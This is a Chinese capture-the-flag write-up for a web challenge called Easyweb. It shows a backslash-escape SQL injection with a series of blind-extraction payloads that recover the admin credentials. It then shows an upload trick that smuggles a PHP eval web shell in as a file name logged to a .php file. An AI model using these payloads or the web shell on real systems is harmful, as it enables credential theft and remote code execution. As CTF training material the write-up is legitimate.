SQL注入, php短标签, 代码审计, 文件上传

题目地址：Easyweb

1. 题目信息

进入环境就是一个登录界面，测试了一下发现无论输入什么都没有提示，故先放着。查看是否存在 robots.txt，里面提示了 *.php.bak，经过多次测试，终于找到 image.php.bak，内容如下： 

<?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path);

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);

2. 解题

2.1. SQL注入

看到 addslashes 和 str_replace 我猜测大概率是存在sql注入。假设我们提交如下payload： 

?id=1\0&path=or 1=1--+

那么经过 addslashes 和 str_replace 函数后，id和path分别为： 

id = 1\\0 -> id = 1\
path = or 1=1--+

因此，最终带入查询的sql语句如下： 

select * from images where id='1\' or path='or 1=1--+'

第二个单引号被转义，因此第一个单引号和第三个单引号闭合，所以数据库识别到的参数为： 

id = 1\' or path=

没有 path，然后or后面是1=1为真，因此直接返回所有images中所有的内容。使用如下payload取得相关敏感信息： 

1. ?id=-1\0&path=or+length(database())=10--+
2. ?id=-1\0&path=or+ascii(substr(database(),%d,1))=%d--+
3. ?id=-1\0&path=or+length((select+group_concat(table_name)from+information_schema.tables+where+table_schema=database()))=%d--+
4. ?id=-1\0&path=or+ascii(substr((select+group_concat(table_name)from+information_schema.tables+where+table_schema=database()),%d,1))>%d--+
5. ?id=-1\0&path=or+length((select+group_concat(column_name)from+information_schema.columns+where+table_schema=database()))=%d--+
6. ?id=-1\0&path=or+ascii(substr((select+group_concat(column_name)from+information_schema.columns+where+table_schema=database()),%d,1))=%d--+
7. ?id=-1\0&path=or+length((select+username+from+users))=%d--+
8. ?id=-1\0&path=or+length((select+password+from+users))=%d--+
9. ?id=-1\0&path=or+ascii(substr((select+username+from+users),%d,1))=%d--+
10. ?id=-1\0&path=or+ascii(substr((select+password+from+users),%d,1))=%d--+

敏感信息： 

数据库长度：10
99 105 115 99 110 102 105 110 97 108 -> ciscnfinal

表长度：12
105 109 97 103 101 115 44 117 115 101 114 115 -> images,users

字段名长度：25
105 100 44 112 97 116 104 44 117 115 101 114 110 97 109 101 44 112 97 115 115 119 111 114 100 -> id,path,username,password

username 字段长度 5 -> 97 100 109 105 110 -> admin
password 字段长度 20
-> 52 52 99 57 52 56 51 55 52 99 101 49 100 97 50 101 54 49 54 100
-> 44c948374ce1da2e616d

然后利用得到的用户名和密码登录

2.2. 文件上传

随便上传一个图片

这句话的大致意思是：将我们上传的图片的名字记录在了日志里面。注意这个日志是php后缀，并且记录文件名。

访问日志，确实保存了我们上传的图片的文件名

经过测试，无法直接上床php文件，那就根据上面的信息，创建一个名字为一句话木马的文件，然后上传 

<?php eval($_POST['cmd']);?>

思考，系统是如何知道该文件是php文件呢？既没有后缀，文件也没有任何内容，抓包信息中的 Content-Type 也没有php

因此，唯一的解释就是，文件名中不能出现php，那么使用短标签绕过，文件名改为： 

<?= eval($_POST['cmd']);?>

然后上传

访问对应日志，可以看到文件名没有了，这是好事，说明很有可能这个php代码被执行了，所以没有显示出来。

直接使用蚁剑连接，在根目录刷新以下，找到flag

  3. 文件上传
